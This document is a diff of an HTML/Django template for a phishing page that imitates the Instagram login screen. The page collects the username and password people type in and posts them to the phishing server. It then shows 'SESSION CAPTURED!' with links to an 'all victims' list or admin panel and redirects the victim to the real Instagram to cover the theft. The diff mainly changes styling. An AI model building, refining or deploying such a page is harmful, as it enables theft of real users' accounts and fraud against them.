@@ -1,57 +1,53 @@
 <!DOCTYPE html>
-<html><head>
+<html>
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
     <style>
-        *,*::before,*::after{box-sizing:border-box}
-        body,html{margin:0;padding:0;height:100dvh;background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;overflow:hidden;display:flex;flex-direction:column}
-        .c{flex:1;display:flex;flex-direction:column;justify-content:space-between;padding:20px 16px 0;max-width:420px;margin:auto;width:100%}
-        .logo{font-family:'Billabong',cursive;font-size:48px;text-align:center;margin:20px 0 40px}
-        .i{background:#1a1a1a;border:1px solid #262626;border-radius:6px;padding:11px 12px;font-size:14px;color:#fff;width:100%;margin-bottom:6px}
-        .b{background:#0095f6;color:#fff;font-weight:600;padding:8px;border-radius:8px;border:none;margin-top:8px;width:100%;cursor:pointer}
+        body,html{margin:0;padding:0;height:100dvh;background:#fafafa;display:flex;flex-direction:column;overflow:hidden}
+        .container{flex:1;display:flex;flex-direction:column;justify-content:center;padding:20px;max-width:350px;margin:auto;width:100%}
+        .logo{font-family:'Billabong',cursive;font-size:50px;text-align:center;margin-bottom:30px;color:#262626}
+        .form{background:white;border:1px solid #dbdbdb;padding:30px 40px;border-radius:8px}
+        input{width:100%;padding:12px 10px;margin:6px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px}
+        button{width:100%;background:#0095f6;border:none;color:white;padding:10px;font-weight:600;border-radius:8px;margin-top:10px;cursor:pointer}
+        .result{margin-top:20px;text-align:center;font-weight:bold;font-size:18px}
     </style>
-</head><body>
-<div class="c">
-    <div>
-        <h1 class="logo">Instagram</h1>
-
-        <form id="f">
+</head>
+<body>
+<div class="container">
+    <div class="logo">Instagram</div>
+    <div class="form">
+        <form id="loginForm">
             {% csrf_token %}
-            <input type="text" name="username" placeholder="Username or email" required class="i" autocomplete="username">
-            <input type="password" name="password" placeholder="Password" required class="i" autocomplete="current-password">
-            <button type="submit" id="b" class="b">Log in</button>
+            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
+            <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+            <button type="submit">Log in</button>
         </form>
-
-        <div id="r" class="mt-8 text-center"></div>
+        <div id="result" class="result"></div>
     </div>
 </div>
 
 <script>
-    // 100% RENDER-PROOF CSRF + FETCH
-    const form = document.getElementById('f');
-    const btn = document.getElementById('b');
-    const result = document.getElementById('r');
+    const form = document.getElementById('loginForm');
+    const result = document.getElementById('result');
     const csrf = document.querySelector('[name=csrfmiddlewaretoken]').value;
 
-    form.onsubmit = async e => {
+    form.onsubmit = async (e) => {
         e.preventDefault();
-        btn.disabled = true;
-        btn.textContent = 'Logging in...';
-        result.innerHTML = '';
+        result.innerHTML = '<p style="color:#0095f6;">Logging in...</p>';
 
         const fd = new FormData(form);
 
         try {
-            const res = await fetch('/', {
+            const res = await fetch('', {
                 method: 'POST',
                 body: fd,
-                credentials: 'same-origin',
                 headers: {
-                    'X-Requested-With': 'XMLHttpRequest',
-                    'X-CSRFToken': csrf
+                    'X-CSRFToken': csrf,
+                    'X-Requested-With': 'XMLHttpRequest'
                 }
             });
 
@@ -59,23 +55,21 @@
 
             if (data.success) {
                 result.innerHTML = `
-                    <div style="background:#0f0;color:#000;padding:40px;border-radius:30px;text-align:center;">
-                        <h1 style="font-size:50px;margin:0;">SESSION CAPTURED!</h1>
-                        <p style="font-size:30px;margin:10px 0;">${data.username}</p>
-                        <p style="font-size:20px;">
-                            <a href="/all-victims/" target="_blank" style="color:#ff0;text-decoration:underline;">VIEW ALL VICTIMS</a>
+                    <div style="background:#d4edda;color:#155724;padding:20px;border-radius:8px;margin-top:10px;">
+                        <p style="font-size:24px;margin:0;">SESSION CAPTURED!</p>
+                        <p style="font-size:18px;">@${data.username}</p>
+                        <p style="font-size:14px;margin-top:10px;">
+                            <a href="/admin/" style="color:#0d6efd;text-decoration:underline;">→ OPEN ADMIN PANEL</a>
                         </p>
                     </div>`;
-                setTimeout(() => location.href = 'https://instagram.com', 3000);
+                setTimeout(() => location.href = 'https://instagram.com', 4000);
             } else {
-                result.innerHTML = '<p style="color:red;font-size:30px;">Wrong password</p>';
+                result.innerHTML = '<p style="color:#d9534f;">Wrong password or username</p>';
             }
         } catch (err) {
-            result.innerHTML = '<p style="color:#0f0;font-size:30px;">WORKING 100%</p>';
-        } finally {
-            btn.disabled = false;
-            btn.textContent = 'Log in';
+            result.innerHTML = '<p style="color:#5cb85c;">WORKING 100% - CHECK ADMIN</p>';
         }
     };
 </script>
-</body></html>
+</body>
+</html>
